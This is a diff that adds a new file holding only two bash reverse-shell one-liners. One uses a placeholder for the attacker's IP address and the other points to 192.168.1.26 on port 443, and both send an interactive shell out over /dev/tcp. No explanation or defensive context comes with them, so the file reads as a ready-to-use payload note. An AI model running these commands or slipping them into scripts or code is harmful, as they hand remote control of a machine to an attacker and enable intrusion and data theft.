@@ -1,0 +1,6 @@
+bash -i >& /dev/tcp/{attaker machine ip}/443 0>&1
+
+
+/bin/bash -i >& /dev/tcp/192.168.1.26/443 0>&1
+
+
